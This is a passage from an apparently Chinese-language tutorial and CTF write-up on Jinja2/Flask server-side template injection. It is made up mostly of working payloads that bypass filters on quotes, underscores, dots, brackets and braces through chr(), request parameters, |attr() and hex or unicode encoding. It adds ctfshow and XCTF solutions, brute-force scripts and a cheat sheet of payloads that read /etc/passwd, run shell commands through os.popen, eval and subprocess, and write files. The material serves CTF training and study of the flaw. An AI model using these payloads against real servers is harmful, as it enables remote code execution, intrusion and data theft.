{% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
```

```
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
```

等同于

```
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
```

##### 利用request对象绕过

request有两种形式，`request.args`和`request.values`，当args被过滤时我们可以使用values，且这种方法POST和GET传递的数据都可以被接收，相对于通过`chr()`进行绕过，这种方法更为简单和便捷。

```
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

构造后为

```
{{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&os=os&cmd=ls /
```

#### 过滤了下划线`_`

##### 利用request对象绕过

又用到了这种方法，看来这种方法十分强大

```
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

构造后为

```
{{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&os=os&cmd=ls /
```

#### 过滤了点`.`

##### 利用`|attr()`绕过

`|attr()`为jinja2原生函数，是一个过滤器，它只查找属性获取并返回对象的属性的值，过滤器与变量用管道符号（ `|` ）分割，它不止可以绕过点。所以可以直接利用，即

```
().__class__   相当于  ()|attr("__class__")
```

构造一个

```
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

过滤后为

```
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls /")|attr("read")()}}
```

`|attr()`配合其他绕过方法可以同时绕过下划线、引号、点、中括号等。

##### 利用中括号`[]`绕过

使用中括号直接进行拼接

```
{{().__class__.__bases__.[0].__subclasses__().[59].__init__['__globals__']['__builtins__'].eval('__import__("os").popen("ls /").read()')}}
```

过滤后为

```
{{''['__class__']['__bases__'][0]['__subclasses__']()[59]['__init__']['__globals__']['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
```

同时，我们可以发现,这样绕过点之后，我们几乎所有的关键字都成了字符串，我们就可以用上面的一些方法绕过了，比如hex编码，这样我们几乎可以绕过全部的过滤。

##### 过滤了大括号`{{`

我们可以用Jinja2的`{%...%}`语句装载一个循环控制语句来绕过，这里我们在一开始认识flask的时候就学习了：

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
```

这里在一开始的时候通过`{%...%}`载入了两个循环语句，通过for和if遍历函数，寻找出`'catch_warnings'`这一命令然后将其命名为c，再通过找出的c命令组合构造语句，执行命令，最后用在引入两个end语句来终止前面的for和if的循环语句。

也可以使用 `{% if ... %}1{% endif %}` 配合 `os.popen` 和 `curl` 将执行结果外带（不外带的话无回显）出来：

```
{% if ''.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls /' %}1{% endif %}
```

也可以用 `{%print(......)%}` 的形式来代替`{{ }}`，如下：

```
{%print(''.__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read())%}
```

### 组合绕过

以下摘抄了S神的绕过姿势，tql。

* * *

#### 同时过滤了 . 和 \[\]

`|attr()`+`__getitem__`

**绕过姿势：** 

```
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}
```

**等同于：** 

```
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}
```

#### 同时过滤了 __ 、点. 和 \[\]

`__getitem__`+`|attr()`+`request`

```
{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}&x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('ls /').read()
```

**相当于：** 

```
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

#### 配合Unicode编码绕过很多过滤

```
'  request  {{  _  %20(空格)  [  ]  .  __globals__   __getitem__
```

我们用`{%...%}`绕过对 `{{` 的过滤，用`|attr()`绕过`.`，并用unicode绕过对关键字的过滤，然后`__getitem__`绕过中括号。

**如下，后面的命令其实也可以换掉，但是没过滤，就先不换了：** 

```
{{()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(77)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("os")|attr("popen")("ls")|attr("read")()}}
```

**等同于：** 

```
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}
```

#### 配合Hex编码绕过很多过滤

**和上面Unicode的环境一样，方法也一样，就是换了种编码**

**如下**

```
{{()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(258)|attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("os")|attr("popen")("cat\x20\x66\x6c\x61\x67\x2e\x74\x78\x74")|attr("read")()}}
```

**等同于：** 

```
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(77)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("ls")|attr("read")()}}
```

**大家可以发现这几种方法中都用到了**`|attr()`，前面也说过，这是 JinJa 的一种过滤器，下面我们可以详细了解一下 JinJa 的过滤器，以便我们加深对绕过的理解，以及研究以后新的绕过。

* * *

刷题看看
----

### 一个实例 [题目 (xctf.org.cn)](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5408&page=2)Web\_python\_template_injection

#### 1.判断有无模板注入

```
http://111.200.241.244:61745/{{1+1}}
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221216150001-426df750-7d0f-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221216150001-426df750-7d0f-1.png)

#### 2.查看一下全局变量

```
url/{{config}}
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221216150001-42ad021a-7d0f-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221216150001-42ad021a-7d0f-1.png)

补个知识

文件包含：是通过python的对象的继承来一步步实现文件读取和命令执行的的。  
思路：找到父类<type ‘object’>–>寻找子类–>找关于命令执行或者文件操作的模块。

可能用到的魔术方法列举一下

```
__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   返回该对象所继承的基类  // __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用
```

#### 3.寻找可用引用

```
{{''.__class__.__mro__[2].__subclasses__()}}
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221216150002-432c4b24-7d0f-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221216150002-432c4b24-7d0f-1.png)

可以看到在40的位置有一个type file类型（可以进行文件读取）

```
{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}
```

可以看到7有一个<class ‘site._Printer’>类型（可以进行命令执行）

```
{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221216150002-4369e3f8-7d0f-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221216150002-4369e3f8-7d0f-1.png)

#### 4.读取flag

```
{{''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()}}
```

```
ctf{f22b6844-5169-4054-b2a0-d95b9361cb57}
```

### ctfshow web361

题目说名字就是考点

所以传参为`?name=`

传入?name={undefinde{1+1}}回显2

这里利用`os._warp_close`类，一看有不少，写个脚本来找吧

```
import requests
from tqdm import tqdm

for i in tqdm(range(233)):
    url = 'http://3b571901-c1e3-41a6-96b3-605942386ec5.challenge.ctf.show/?name={{%22%22.__class__.__bases__[0].__subclasses__()['+str(i)+']}}'
    r = requests.get(url=url).text
    if('os._wrap_close' in r):
        print(i)
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221216150003-43af4db2-7d0f-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20221216150003-43af4db2-7d0f-1.png)

输出132

然后利用`. init .globals`来找os类中的。init初始化，globals全局查找

```
?name={{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__}}
```

其中能看到popen，于是利用其来执行命令

```
?name={{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls').read()}}
```

payload:

```
?name={{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
```

### ctfshow web362

随便试了试没发现过滤了啥

然后提交一下上一道题的payload，失败了 回显一个哭脸

查了一下 原来是过滤了数字

又查了查ssti过滤数字，找到了一个数字替换的脚本

将数字替换成全角数字

```
def half2full(half):  
    full = ''  
    for ch in half:  
        if ord(ch) in range(33, 127):  
            ch = chr(ord(ch) + 0xfee0)  
        elif ord(ch) == 32:  
            ch = chr(0x3000)  
        else:  
            pass  
        full += ch  
    return full  
t=''
s="0123456789"
for i in s:
    t+='\''+half2full(i)+'\','
print(t)
```

替换完了之后的payload

```
?name={{"".__class__.__bases__[０].__subclasses__()[１３２].__init__.__globals__['popen']('cat /flag').read()}}
```

```
ctfshow{90be8203-4e24-458f-8fc9-14062aed72c8}
```

然后再看别的大佬写的wp的时候发现362和363可以用一个payload提交

```
Payload:?name={{lipsum.__globals__.__getitem__("os").popen("cat /flag").read()}}
```

### ctfshow web363

测试发现过滤了引号

如何绕过呢？下面来自[Python模板注入(SSTI)深入学习 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6885#toc-4)

* * *

#### 过滤引号

回顾我们上面的payload，哪里使用了引号？

![](https://xzfile.aliyuncs.com/media/upload/picture/20191207110222-fd656e82-189d-1.jpg)

接下来思考对应的解决办法，首先第一个引号的作用是什么，是为了引出基类，而任何数据结构都可以引出基类，所以这里可以直接使用数组代替，所以上述payload就变成了：

```
{{[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__["os"]["popen"]("whoami").read()}}
```

在fuzz的时候我发现，数据结构可以被替换为数组、字典，以及`数字0`。

再看看后面的引号是用来干嘛的，首先看看. **init** .**globals**返回的是什么类型的数据:

![](https://xzfile.aliyuncs.com/media/upload/picture/20191207110223-fd8486c8-189d-1.jpg)

所以第一个引号就是获取字典内对应索引的value，这里我们可以使用request.args来绕过此处引号的过滤。

request.args是flask中一个存储着请求参数以及其值的字典，我们可以像这样来引用他：

![](https://xzfile.aliyuncs.com/media/upload/picture/20191207110223-fdd1a6e2-189d-1.jpg)

所以第二个引号的绕过方法即：

```
{{[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[request.args.arg1]}}&arg1=os
```

后面的所有引号都可以使用该方法进行绕过。

还有另外一种绕过引号的办法，即通过python自带函数来绕过引号，这里使用的是chr()。

首先fuzz一下chr()函数在哪：

payload：

```
{{().__class__.__bases__[0].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr}}
```



![](https://xzfile.aliyuncs.com/media/upload/picture/20191207110224-fe3c4df8-189d-1.jpg)


通过payload爆破subclasses，获取某个subclasses中含有chr的类索引，可以看到爆破出来很多了，这里我随便选一个。

```
{%set+chr=[].__class__.__bases__[0].__subclasses__()[77].__init__.__globals__.__builtins__.chr%}
```

接着尝试使用chr尝试绕过后续所有的引号：

```
{%set+chr=[].__class__.__bases__[0].__subclasses__()[77].__init__.__globals__.__builtins__.chr%}{{[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[chr(111)%2bchr(115)][chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(108)%2bchr(115)).read()}}
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20191207110224-fea00528-189d-1.jpg)

* * *

假设传入`{{ config.__class__.__init__.__globals__['os'] }}`,因为引号被过滤，所以无法执行，可以把`'os'`换成`request.args.a`(这里的a可以理解为自定义的变量，名字可以任意设置)

随后在后面传入a的值，变成`{{ config.__class__.__init__.__globals__[request.args.a] }}&a=os`，与原命令等效

Payload:  
比如我们要构造`?name={{ config.__class__.__init__.__globals__['os'].popen('cat ../flag').read() }}`，但是引号不能使用了，就可以把这两处使用引号的地方替换掉，最终变成  
`?name={{ config.__class__.__init__.__globals__[request.args.a].popen(request.args.b).read() }}&a=os&b=cat ../flag`  

### ctfshow web364

这个题过滤了单双引号，args，所以上一题的思路无法沿用 换个方法

咋绕过呢，看到了sp4c1ous师傅的文章

* * *

**利用request对象绕过**

```
{{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
#像下面这样就可以直接利用了
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&os=os&cmd=ls /
```

**等同于：** 

```
{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
​
{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

**如果过滤了**`args`，可以将其中的`request.args`改为`request.values`，POST和GET两种方法传递的数据`request.values`都可以接收。

* * *

按照大佬的方法做个payload

```
?name={{lipsum.__globals__.os.popen(request.values.gg).read()}}&gg=cat /flag
```

```
ctfshow{2e39f741-f60e-4cb9-a889-00441ac46737}
```

看了一下别人的wp，还可以用cookie绕过

利用bp抓包然后传入cookie的值



![](https://xzfile.aliyuncs.com/media/upload/picture/20221216150003-43e8c4d4-7d0f-1.png)


效果一样

### ctfshow web365

字符串拼接绕过

应该是过滤了单双引号，args，\[\]

中括号可以用点或者`__getitem__`绕过

通过`__getitem__()`构造任意字符，比如

?name={{config.\_\_str\_\_().\_\_getitem\_\_(22)}}   \# 就是22

整个脚本

```
import requests
url="http://967b7296-6f76-444e-83d3-519ce6624dea.challenge.ctf.show/?name={{config.__str__().__getitem__(%d)}}"

payload="cat /flag"
result=""
for j in payload:
    for i in range(0,1000):
        r=requests.get(url=url%(i))
        location=r.text.find("<h3>")
        word=r.text[location+4:location+5]
        if word==j:
            print("config.__str__().__getitem__(%d) == %s"%(i,j))
            result+="config.__str__().__getitem__(%d)~"%(i)
            break
print(result[:len(result)-1])
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20221216150004-4433fa44-7d0f-1.png)


得到

```
config.__str__().__getitem__(22) == c
config.__str__().__getitem__(40) == a
config.__str__().__getitem__(23) == t
config.__str__().__getitem__(7) ==  
config.__str__().__getitem__(279) == /
config.__str__().__getitem__(4) == f
config.__str__().__getitem__(41) == l
config.__str__().__getitem__(40) == a
config.__str__().__getitem__(6) == g
```

构造payload

```
?name={{url_for.__globals__.os.popen(config.__str__().__getitem__(22)~config.__str__().__getitem__(40)~config.__str__().__getitem__(23)~config.__str__().__getitem__(7)~config.__str__().__getitem__(279)~config.__str__().__getitem__(4)~config.__str__().__getitem__(41)~config.__str__().__getitem__(40)~config.__str__().__getitem__(6)
).read()}}
```

方法二：values传参

```
# values 没有被过滤
?name={{lipsum.__globals__.os.popen(request.values.ocean).read()}}&ocean=cat /flag
```

方法三：cookie传参

```
# cookie 可以使用
?name={{url_for.__globals__.os.popen(request.cookies.c).read()}}
Cookie:c=cat /flag
```

### ctfshow web366

过滤了单双引号，args，\[\]，_，os

单双引号可以用request对象绕过，由于过滤了args，所以我们用request.values来绕过

过滤了\[\]我们用|attr()来绕过

过滤_我们也用request对象来绕过

os我们可以用编码来绕过

payload

```
?name={{lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()}}&ocean=cat /flag&a=__globals__&b=__getitem__&c=os&d=popen&f=read
```

```
ctfshow{0c9d868e-81c8-4c30-a2d4-534e5e17e8b6}
```

### ctfshow web367

过滤了单双引号、args、中括号\[\]、下划线、os

和上一个差不多，直接原payload提交

### ctfshow web368

过滤单双引号、args、中括号\[\]、下划线、os、{undefined{undefined

不能使用`{{`来进行提交了，但是我们可以用`{%`来进行绕过

```
?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&a=__globals__&b=os&c=cat /flag
```

第二种也可以采用盲注的办法，写个脚本跑一下

基础太差，找个脚本跑一下吧

```
def search(obj, max_depth):

    visited_clss = []
    visited_objs = []

    def visit(obj, path='obj', depth=0):
        yield path, obj

        if depth == max_depth:
            return

        elif isinstance(obj, (int, float, bool, str, bytes)):
            return

        elif isinstance(obj, type):
            if obj in visited_clss:
                return
            visited_clss.append(obj)
            #print(obj) Enumerates the objects traversed

        else:
            if obj in visited_objs:
                return
            visited_objs.append(obj)

        # attributes
        for name in dir(obj):
            try:
                attr = getattr(obj, name)
            except:
                continue
            yield from visit(attr, '{}.{}'.format(path, name), depth + 1)

        # dict values
        if hasattr(obj, 'items') and callable(obj.items):
            try:
                for k, v in obj.items():
                    yield from visit(v, '{}[{}]'.format(path, repr(k)), depth)
            except:
                pass

        # items
        elif isinstance(obj, (set, list, tuple, frozenset)):
            for i, v in enumerate(obj):
                yield from visit(v, '{}[{}]'.format(path, repr(i)), depth)

    yield from visit(obj)


num = 0
for item in ''.__class__.__mro__[-1].__subclasses__():
    try:
        if item.__init__.__globals__.keys():
            for path, obj in search(item,5):
                if obj in ('__builtins__','os','eval'):
                    print('[+] ',item,num,path)

        num+=1
    except:
        num+=1
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20221216150005-44d2ac66-7d0f-1.png)

有点慢啊，先让他跑着吧，有结果了再回来更新

### ctfshow web369

过滤单双引号、args、中括号\[\]、下划线、os、{undefined{、request

request被ban了，突然不知道怎么搞了

```
?name={{%27%27.__class__.__base__.__subclasses__()}}
?name={%print(%27%27|attr(class).|attr(base).|attr(subclasses())%}
```

总结
--

### 获取基类的几种办法

```
[].__class__.__base__
''.__class__.__mro__[2]
().__class__.__base__
{}.__class__.__base__
request.__class__.__mro__[8] 　　//针对jinjia2/flask为[9]适用
或者
[].__class__.__bases__[0]       //其他的类似

**注意：如果._'这些被过滤了，可以用16进制编码绕过！！！**
例如：{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()}}
特别注意用16进制编码之后里面要加"
```

```
__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。

request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1      get传参
request.values.x1    所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1      post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data         post传参 (Content-Type:a/b)
request.json         post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
g                    {{g}}得到<flask.g of 'flask_ssti'>
```

### 常用的过滤器，从别的师傅的博客里摘录的：

```
int()：将值转换为int类型；

float()：将值转换为float类型；

lower()：将字符串转换为小写；

upper()：将字符串转换为大写；

title()：把值中的每个单词的首字母都转成大写；

capitalize()：把变量值的首字母转成大写，其余字母转小写；

trim()：截取字符串前面和后面的空白字符；

wordcount()：计算一个长字符串中单词的个数；

reverse()：字符串反转；

replace(value,old,new)： 替换将old替换为new的字符串；

truncate(value,length=255,killwords=False)：截取length长度的字符串；

striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；

escape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。

safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；

list()：将变量列成列表；

string()：将变量转换成字符串；

join()：将一个序列中的参数值拼接成字符串。示例看上面payload；

abs()：返回一个数值的绝对值；

first()：返回一个序列的第一个元素；

last()：返回一个序列的最后一个元素；

format(value,arags,*kwargs)：格式化字符串。比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!

length()：返回一个序列或者字典的长度；

sum()：返回列表内数值的和；

sort()：返回排序后的列表；

default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。

length()返回字符串的长度，别名是count
```

```
控制结构 {% %}
变量取值 {{ }}
注释 {# #}
```

```
{{[].__class__.__base__.__subclasses__()}}   //查看所有的模块
```

os模块都是从warnings.catch\_warnings模块入手的，在所有模块中查找catch\_warnings的位置，为第59个

利用到的是func_globals.keys() ：查看全局函数

```
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()' )
```

查看flag文件所在

```
{{"".__class__.__mro__[2].__subclasses__()[40]("fl4g").read()}}
```

读取文件 利用到的是object对象下的file类的read函数

```
[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
```

### 常见的基础调用类函数执行

```
>>>''.\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()
返回子类的列表 \[,,,...\]
从中随便选一个类,查看它的\_\_init\_\_
>>>''.\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()\[30\].\_\_init\_\_
<slot wrapper '\_\_init\_\_' of 'object' objects>
wrapper是指这些函数并没有被重载，这时他们并不是function，不具有\_\_globals\_\_属性
#再换几个子类，很快就能找到一个重载过\_\_init\_\_的类，比如
''.\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()\[5\].\_\_init\_\_
''.\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()\[5\].\_\_init\_\_.\_\_globals\_\_\['\_\_builtins\_\_'\]\['eval'\]
然后用eval执行命令即可
```

```
获取基类
//获取基本类
{{[].__class__}}

//获取所有类
''.__class__.__mro__[2].__subclasses__()
获取config对象与request对象类

{{url_for.__globals__}}
{{config}}#即查看权限
{{ config.SQLALCHEMY_DATABASE_URI }}

python2
#读取文件类，<type ‘file’> file位置一般为40，直接调用
[].__class__.__base__.__subclasses__()[40]('fl4g').read()

<class ‘site._Printer’> #调用os的popen执行命令
{{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}
[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls /flasklight').read()
[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat coomme_geeeett_youur_flek').read()

#如果system被过滤，用os的listdir读取目录+file模块读取文件：
().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')

<class ‘subprocess.Popen’> 位置一般为258
{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
{{''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()}}
{{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}

<class ‘warnings.catch_warnings’>
#一般位置为59，可以用它来调用file、os、eval、commands等
#调用file
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()      #把 read() 改为 write() 就是写文件
#读文件
().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()
object.__subclasses__()[40](r'C:\1.php').read()
#写文件
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
object.__subclasses__()[40]('/var/www/html/input', 'w').write('123')

#调用eval
[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")
#调用system方法
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')
#调用commands进行命令执行
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')

python3
#读取文件与写文件类
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()}}
#执行命令
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}}
#命令执行：
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
#文件操作
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```